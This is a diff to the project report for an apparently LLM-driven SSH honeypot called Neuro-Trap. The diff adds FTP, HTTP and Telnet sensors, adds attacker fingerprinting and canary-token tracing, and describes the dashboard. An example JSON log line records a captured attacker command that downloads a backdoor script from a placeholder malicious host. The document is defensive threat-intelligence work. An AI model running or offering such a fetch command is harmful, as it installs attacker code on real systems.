@@ -3,7 +3,7 @@
 
 **Project Title:** Neuro-Trap — An AI-Powered SSH Honeypot with Real-Time Threat Intelligence Dashboard
 
-**Technology Stack:** Python 3.x, Paramiko (SSH), Ollama + Meta Llama 3.2 (3B), Streamlit, Plotly, Pandas
+**Technology Stack:** Python 3.x, Paramiko (SSH), pyftpdlib (FTP), Ollama + Meta Llama 3.2 (3B), Streamlit, Plotly, Pandas, MongoDB Atlas
 
 ---
 ---
@@ -67,6 +67,8 @@ The result is a honeypot that feels like a genuine Ubuntu 22.04 LTS production s
 | O3 | **Comprehensive Credential & Command Logging** | Log all attacker interactions — authentication attempts (usernames & passwords), executed commands, session metadata (IP, timestamp, duration) — in structured JSON format for forensic analysis. |
 | O4 | **Real-Time Threat Intelligence Dashboard** | Develop a Streamlit-based Command Center with live metrics, global geo-mapped threat visualization, attack velocity timelines, password analytics pie charts, and raw terminal intercept logs. |
 | O5 | **Realistic SSH Emulation** | Ensure the SSH handshake, server banner, terminal escape sequences (arrow keys, backspace, Ctrl+C, Tab), and login sequence are indistinguishable from a genuine OpenSSH server. |
+| O6 | **Multi-Protocol Intelligence** | Expand sensing capabilities beyond SSH to include HTTP, FTP, and Telnet, capturing a wider spectrum of botnet and web-scanner activity. |
+| O7 | **Adversary Fingerprinting** | Implement deep forensic tracking (HASSH, SSH Keys) to identify threat actors uniquely across rotating IPs and VPNs. |
 
 ---
 ---
@@ -741,6 +743,35 @@ Every event is simultaneously written to the JSON log file for dashboard consump
 {"timestamp": "2026-02-22T17:51:02", "level": "INFO", "event_type": "COMMAND", "ip": "192.168.1.105", "message": "wget http://malicious-site.com/backdoor.sh", "details": {"command": "wget http://malicious-site.com/backdoor.sh"}}
 {"timestamp": "2026-02-22T17:52:00", "level": "INFO", "event_type": "DISCONNECT", "ip": "192.168.1.105", "message": "Connection closed from 192.168.1.105", "details": {}}
 ```
+
+---
+---
+
+## 7. ENTERPRISE EVOLUTION: ADVANCED THREAT INTELLIGENCE
+
+In the final phase of development, Neuro-Trap was upgraded to an Enterprise-Grade Threat Intelligence Platform through the implementation of 15 advanced forensic and sensing features.
+
+### 7.1 Multi-Protocol Sensor Network (Multi-Port Mesh)
+To increase threat data volume, the system was moved from a single SSH listener to a multi-port protocol mesh:
+- **Port 2222 (SSH)**: Targets advanced persistent threats and manual interactive hackers.
+- **Port 8080 (HTTP)**: Mimics an Apache/phpMyAdmin instance to trap PHP exploit kits and SQL injection bots.
+- **Port 2121 (FTP)**: Traps file exfiltration scans and credential brute-force attacks.
+- **Port 2323 (Telnet)**: Specifically designed to capture IoT botnets like Mirai, Hajime, and Mozi.
+
+### 7.2 Deep Forensic Intelligence Features
+1. **HASSH Fingerprinting**: MD5 hash of client-side SSH negotiation algorithms, creating a unique persistent ID for attackers even if they switch IPs.
+2. **SSH Public Key Capture**: Intercepts and logs the SHA256 fingerprints of attacker-provided SSH keys.
+3. **MITRE ATT&CK Kill Chain**: Automatic mapping of every command to the specific stage of the cyber kill chain (Discovery, Lateral Movement, etc.).
+4. **Keystroke Dynamics**: Differentiation between "Manual Typing" and "Pasted Scripts" based on inter-keystroke timing analysis.
+5. **Canary Token De-anonymization**: Bait files contain unique URLs that, when clicked by an attacker, bypass their VPN to capture their real public IP and browser headers.
+6. **Infrastructure Classification**: Automatic categorization of attacker IPs into *Hosting*, *Cloud Server*, *Residential*, or *Mobile* origins.
+7. **Reverse DNS Infrastructure Check**: Real-time lookups to identify if an attacker is originating from known bad domains or security-scanning companies.
+
+### 7.3 Advanced Analytics & Visualization
+- **Credential Wordcloud**: A size-weighted visual representation of the most attempted usernames and passwords.
+- **ISP Attribution Chart**: Identifying the "Host of Choice" for regional threat groups (e.g., Alibaba, DigitalOcean, Tencent).
+- **Live Audio Sonar**: A toggleable real-time audio ping system that alerts analysts to high-severity events via the dashboard.
+- **Adversary Bio-Cards**: High-density UI components showing session duration, kill-chain progress, and origin profiling at a glance.
 
 ---
 ---
